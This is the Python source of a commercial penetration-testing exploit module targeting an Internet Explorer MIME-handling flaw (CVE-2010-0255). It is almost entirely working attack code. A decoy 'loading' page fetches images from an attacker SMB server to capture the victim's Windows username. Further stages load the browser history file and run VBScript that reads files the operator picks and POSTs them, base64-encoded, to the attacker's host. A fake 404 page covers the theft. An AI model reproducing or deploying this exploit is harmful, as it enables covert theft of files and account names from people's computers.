#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2010
#http://www.immunityinc.com/CANVAS/ for more information

#
# CANVAS Exploit
#

import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

from smbserver import *
from threading import *
from random import randint
import os.path
from internal import devlog

NAME="Internet Explorer local file include"
DESCRIPTION="A flaw in the MIME/type comprobation in IE that can be used to force IE to interpret non-html files."
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Repeatability"]="Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"] = "CVE-2010-0255"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0255"
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION["CVS URL"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0255"
DOCUMENTATION["MSRC"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0255"
DOCUMENTATION["Date public"] = "01/07/2010"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP","2003","Vista"]
PROPERTY['MSADV'] = ""
PROPERTY['DELIVERY']='HTTP'

TODO ="""
    Try to make this work on IE6 and more testing in IE7
"""

NOTES="""
    Use from httpserver with name ie_dumpfiles, and name of remote files are written with absolute path without drive letter.
    Example: [Arguments:] files:/boot.ini;/WINDOWS/ie8.log name:iedump.html
    Use as root, need port 443 for SMB incoming connections.
"""

CHANGELOG="""

"""

DEBUGNOTES="""

"""

THE_EXPLOIT = 'ie_dumpfiles'

#parse_qs moved to urlparse in 2.6, but is only in cgi in 2.5
try:
    from urlparse import parse_qs 
except ImportError:
    devlog("ie_dumpfiles","Using parse_qs from cgi (Python 2.5)")
    from cgi import parse_qs 

import base64
from engine.config import canvas_reports_directory as reportdir

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.searchMethod = self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent = [("Mozilla/", "MSIE", "")]

        self.setVersions()
        self.version=1
        self.name=NAME
        self.filename="iedump.html"
        self.secondst="2nd%d.html" %(randint(0, 100000))
        self.thirdst="3rd%d.vbs" %(randint(0, 100000))
        self.share_res="r%d.jpg" %(randint(0, 100000))
        self.listenerArgsDict["fromcreatethread"]=1
        self.remote_account="" #None yet, but we need the variable

        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=("Windows - all versions",None)

    def run(self):
        self.log("Must be run from httpserver")
        return 0

    def makefile(self):
        """Makes the html file to start 2nd stage"""
        html="""
        <html>
        <head>
        <title>Loading...</title>
        </head><body onload="to2nd();">
        <h1>The requested page is loading ...</h1>
        <p>Please wait a few moments.</p>
        <div style="visibility: hidden; display: none;" id="uploader">
        """
        # add many files to load from smb to be more reliable
        html += """
        <img src="\\\\%s\\\%s">
        """ % (self.bindip, self.share_res) * 6
        #redirect to the second stage with load file
        html += """
        </div>
        <hr>
        <script language="javascript">
            function to2nd(){
                document.location='%s\\?\\ \\<html\\>\\<script language=\\'vbscript\\' src=\\'http://%s:%d/%s\\'\\></script\\>\\<html\\>';

            }
        </script>
        </body>
        </html>
        """ % (self.secondst, self.bindip, self.port, self.thirdst)

        return html

    def la2nd(self):
        """
        The 2nd stage will load index.dat (history)

        This function requires that the self.remote_account variable is
        already set up!
        """
        remote_account=""
        #time.sleep(1) #sleep for one second so we can get a remote account?
        if self.remote_account:
            remote_account=self.remote_account
        else:
            self.log("Remote account is not set yet?!?")

        html="""
        <html>
        <head>
        <title>Loading...</title>
        </head><body onload="la2nd();">
        <h1>The requested page is loading ...</h1>
        <p>Please wait a few moments.</p>
        <div style="visibility: hidden; display: none;" id="uploader">
        </div>
        <hr>
        <script language="javascript">
        function la2nd(){
            var obj = document.createElement("object");
            obj.data = "file:\\\\\\\\127.0.0.1\\\\c$\\\\Documents and Settings\\\\%s\\\\Local Settings\\\\History\\\\History.IE5\\\\index.dat";
            obj.type = "text/html";
            obj.id = "obj_results";
            obj.width = "1px";
            obj.height = "1px";
            document.body.appendChild(obj);
        }
        </script>
        </body>
        </html>
        """ % (remote_account)

        return html


    def lavb(self):
        count = len(self.remote_files)
        vbcode = """

        On Error Resume Next

        Dim files(%i)

        """ %(count - 1)
        #add the files to download
        i = 0
        for file in self.remote_files:
            vbcode += "files(%i) = \"%s\"\n" % (i,'../../../../../'+file.lstrip('/'))
            i += 1
        #now send it to us, the evil machine
        vbcode += """

        Dim all_data
        Dim filelist

        filelist = ""
        all_data = ""

        Dim doc
        Set doc = CreateObject("MSXML2.DOMDocument.3.0")
        doc.async=False

        Dim docroot
        Set docroot = doc.createElement("docroot")
        Set doc.documentElement = docroot

        Dim docchild
        Set docchild = doc.createElement("data")
        docroot.appendChild docchild
        docchild.dataType = "bin.base64"

        document.write("<form id='toupload' name='toupload' method='POST' enctype='application/x-www-form-urlencoded'><input name='data' id='data'><input type='submit' value='Submit'></form>")

        For Each file in files
            With CreateObject("MSXML2.XMLHTTP.3.0")
                .open "GET", file, False
                .send
                data = .responseBody

                docchild.nodeTypedValue = data
                data64 = docchild.text

                thislen = len(data64)
                all_data = all_data + data64

                filelist = filelist + file + ":"+ CStr(thislen) + ";"

            End With

        Next

        Dim formupload
        Set formupload = Document.forms("toupload")
        formupload.action = "http://%s:%d/?files=" + filelist
        formupload.data.value = all_data
        formupload.submit

        """ % (self.bindip, self.port)
        return vbcode


    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body
        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)
        if user_agent.count("MSIE")==0:
            #could be spoofed
            self.log("Non IE browser connected - returning None")
            return None,None

        #Get options
        if hasattr(self, "clientsideargs"):
            self.log(self.clientsideargs)
            self.bindip            = self.clientsideargs["bindip"]
            if self.bindip=="0.0.0.0":
                if self.callback:
                    self.log("Using callback.ip for bindip: %s"%self.callback.ip)
                    self.bindip=self.callback.ip 
                else:
                    self.log("Could not figure out callback or bindip - please set bindip to a real IP!")
                    return None, None 

            self.port              = self.clientsideargs["bindport"]
            files      = self.clientsideargs["user_supplied_args"]["files"]
            if self.clientsideargs["user_supplied_args"]["name"]:
                self.filename = self.clientsideargs["user_supplied_args"]["name"]
        else:
            raise NameError("Can not load options, must be run from httpserver")
        self.log("Grabbing files: %s"%str(files))
        if len(files) == 0:
            raise NameError("Specify files to download as files:/boot.ini;/WINDOWS/ie8.log")

        self.remote_files = files.split(";")

        #the different files we can offer to our clients :)
        self.log("Self.filename: %s. Clientheader.URL: %s"%(self.filename, clientheader.URL))
        if self.filename in clientheader.URL:
            self.log("Sending 1st Stage")
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            # Set up the threaded smb server
            t = Thread(target=self.set_up_smb_server)
            t.start()

        elif self.secondst in clientheader.URL:
            self.log("Sending ie dumpfiles exploit's 2nd Stage")
            sploitstring = self.la2nd()
            b.setBody(sploitstring)            

        elif self.thirdst in clientheader.URL:
            self.log("Sending ie dumpfiles exploit's 3rd Stage")            
            sploitstring = self.lavb()
            b.setBody(sploitstring)

        elif "?files" in clientheader.URL:
            self.log("Files arrived!")
            #extract array of data
            remotedata = ''.join(clientbody.data)
            data = parse_qs(remotedata, keep_blank_values=1)
            self.log("Data: %s"%repr(data))
            data = data['data'][0]
            b.setBody("""
            <html>
            <head><title>404 Not Found</title></head>
            <body>
            <h1>Not Found</h1>
            The requested URL / was not found on this server.<p>
            <hr>
            </body>
            </html>
            """)
            self.get_files(clientheader.URL, data)

        else:
            self.log("URL was unexpected: responding with null response. %s"%clientheader.URL)
            sploitstring = "\x41\x41\x41\x41"
            b.setBody(sploitstring)
            remotedata = clientbody.data

        return h,b

    def get_files(self, url, data):

        files = url.split("=")[1]
        files = files.split(";")
        count = 0
        for retrieved_file in files:
            if len(retrieved_file) < 2:
                break
            name, size = retrieved_file.split(":")
            name = name.lstrip('./\\')
            name = os.path.basename(name)
            self.log("%s : %s"%(name,size))
            size = int(size)


            fout = os.path.join(reportdir, name)
            self.log("Writing to file %s" %(fout))

            f = open(fout, "wb")
            fdata = base64.b64decode(data[count:count+size])
            f.write(fdata)
            f.close()
            count += size

    def set_up_smb_server(self):
        """
        Start SMB Server to obtain username
        """
        self.log("Starting SMB Server to obtain the remote username")
        mysmb = SMBServer('0.0.0.0', 445)
        mysmb.timeout = 30

        # Set an image
        f = open("exploits/"+THE_EXPLOIT+"/rand.jpg", "rb")
        data = f.read()
        f.close()

        mysmb.set_file_data('%s' %(self.share_res), data)

        if mysmb.listen()==0:
            self.log("Could not listen on port 445!, are you root?")
            return False

        self.log("SMB Server testing loop accepting")
        no_name=True  
        #do we have a name yet?
        while no_name :
            if self.state==self.HALT:
                mysmb.close()
                self.log("Halted - closing SMB Thread")
                return True 

            mysmb.timeout=3 #3 second timeout
            while mysmb.accept() == 0:
                self.log("SMB - Waiting for new client...")
                if self.state==self.HALT:
                    mysmb.close()
                    self.log("Halted - closing SMB Thread")
                    return True

            while mysmb.handle():
                self.log("SMB - Handled a request.")
                #ugly check
                if len(mysmb.remote_account) > 3:
                    #set to class variable so it can be read from another function
                    self.remote_account = mysmb.remote_account
                    self.log("Username found : %s"%self.remote_account)
                    no_name=False 
        self.log("Done")
        return True 




if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    print "This must be run from httpserver"
    exit(0)
    app = theexploit()
    ret=standard_callback_commandline(app)

